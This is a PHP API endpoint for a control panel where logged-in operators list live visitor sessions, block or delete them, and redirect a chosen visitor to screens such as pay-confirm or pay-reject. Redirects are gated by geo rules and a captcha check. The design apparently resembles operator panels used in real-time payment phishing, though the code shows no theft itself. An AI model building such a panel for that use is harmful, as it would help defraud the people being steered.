<?php

declare(strict_types=1);

require dirname(__DIR__) . '/app/bootstrap.php';
require dirname(__DIR__) . '/app/control-auth.php';
require dirname(__DIR__) . '/app/sessions.php';

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';

if ($method === 'GET' && isset($_GET['list'])) {
    if (!sw_control_logged_in()) {
        sw_json(['ok' => false, 'error' => 'unauthorized'], 401);
    }
    sw_admin_presence_touch();
    sw_session_mark_admin_current();
    $rows = sw_session_list(['q' => (string) ($_GET['q'] ?? ''), 'dedupe_clients' => true]);
    $payload = array_map(static fn(array $row): array => sw_session_live_payload($row), $rows);
    $admins = sw_admin_online_list();
    sw_json([
        'ok' => true,
        'applications' => $payload,
        'stats' => sw_session_stats(),
        'admins_online' => $admins,
        'admins_online_count' => count($admins),
        'today_label' => sw_today_label(),
    ]);
}

if ($method === 'POST') {
    $raw = file_get_contents('php://input') ?: '';
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        $data = $_POST;
    }

    $action = (string) ($data['action'] ?? '');
    $id = trim((string) ($data['id'] ?? ''));

    if (in_array($action, ['ack_redirect', 'self_hold', 'clear_hold'], true)) {
        sw_geo_enforce_public(true);
    }

    if ($action === 'ack_redirect') {
        $nonce = trim((string) ($data['nonce'] ?? ''));
        $sessionId = sw_session_id();
        if ($nonce !== '') {
            sw_session_ack_redirect($sessionId, $nonce);
        }
        sw_json(['ok' => true]);
    }

    if ($action === 'self_hold') {
        $sessionId = sw_session_id();
        // Security: client-side requests can only place the session on the "loading" hold.
        // Admin-controlled redirects to pay-confirm/pay-reject must go through action=redirect (requires admin login).
        $screen = trim((string) ($data['screen'] ?? 'loading'));
        if ($screen !== 'loading') {
            $screen = 'loading';
        }
        if ($sessionId === '') {
            sw_json(['ok' => false, 'error' => 'missing_session'], 400);
        }
        sw_session_set_redirect($sessionId, $screen);
        sw_json(['ok' => true]);
    }

    if ($action === 'clear_hold') {
        sw_session_clear_hold(sw_session_id());
        sw_json(['ok' => true]);
    }

    if (!sw_control_logged_in()) {
        sw_json(['ok' => false, 'error' => 'unauthorized'], 401);
    }

    if ($action === 'redirect') {
        $screen = trim((string) ($data['screen'] ?? ''));
        if ($id === '' || $screen === '') {
            sw_json(['ok' => false, 'error' => 'missing_fields'], 400);
        }

        // Security: block control-panel redirects until the user is verified as "not a bot".
        // This prevents the client from being forced into any panel (via redirect_to/loading_hold).
        $target = sw_session_find($id);
        if (is_array($target) && empty($target['is_blocked'])) {
            $homeCaptchaAtRaw = trim((string) ($target['home_captcha_verified_at'] ?? ''));
            $homeCaptchaVerified = $homeCaptchaAtRaw !== '' && $homeCaptchaAtRaw !== '0';

            if (!$homeCaptchaVerified) {
                $deviceId = trim((string) ($target['device_id'] ?? ''));
                if ($deviceId !== '') {
                    try {
                        $stmt = sw_db()->prepare(
                            'SELECT home_captcha_verified_at FROM sessions
                             WHERE device_id = :did
                               AND home_captcha_verified_at != ""
                               AND home_captcha_verified_at != "0"
                             ORDER BY home_captcha_verified_at DESC
                             LIMIT 1'
                        );
                        $stmt->execute(['did' => $deviceId]);
                        $raw = $stmt->fetchColumn();
                        $homeCaptchaVerified = (int) ($raw ?? 0) > 0;
                    } catch (Throwable $e) {
                        $homeCaptchaVerified = false;
                    }
                }
            }

            if (!$homeCaptchaVerified) {
                sw_json(['ok' => false, 'reason' => 'يلزم التحقق من عدم كونه روبوت أولاً'], 403);
            }
        }

        $updated = sw_session_set_redirect($id, $screen);
        if (!$updated) {
            sw_json(['ok' => false, 'error' => 'not_found'], 404);
        }
        sw_json(['ok' => true, 'application' => sw_session_live_payload($updated)]);
    }

    if ($action === 'block') {
        $ids = sw_request_ids($data);
        if ($ids === []) {
            sw_json(['ok' => false, 'error' => 'missing_id'], 400);
        }
        $count = 0;
        $last = null;
        foreach ($ids as $sid) {
            $result = sw_block_session($sid);
            if (!empty($result['ok'])) {
                $count++;
                $last = $result;
            }
        }
        if ($count === 0) {
            sw_json(['ok' => false, 'error' => $last['error'] ?? 'failed'], 404);
        }
        $payload = is_array($last) ? $last : ['ok' => true];
        $payload['ok'] = true;
        $payload['count'] = $count;
        sw_json($payload);
    }

    if ($action === 'unblock') {
        $ids = sw_request_ids($data);
        if ($ids === []) {
            sw_json(['ok' => false, 'error' => 'missing_id'], 400);
        }
        $count = 0;
        $last = null;
        foreach ($ids as $sid) {
            $result = sw_unblock_session($sid);
            if (!empty($result['ok'])) {
                $count++;
                $last = $result;
            }
        }
        if ($count === 0) {
            sw_json(['ok' => false, 'error' => $last['error'] ?? 'failed'], 404);
        }
        $payload = is_array($last) ? $last : ['ok' => true];
        $payload['ok'] = true;
        $payload['count'] = $count;
        sw_json($payload);
    }

    if ($action === 'delete') {
        $ids = sw_request_ids($data);
        if ($ids === []) {
            sw_json(['ok' => false, 'error' => 'missing_id'], 400);
        }
        foreach ($ids as $sid) {
            sw_session_delete($sid);
        }
        sw_json(['ok' => true, 'count' => count($ids)]);
    }

    sw_json(['ok' => false, 'error' => 'unknown_action'], 400);
}

sw_json(['ok' => false, 'error' => 'method_not_allowed'], 405);
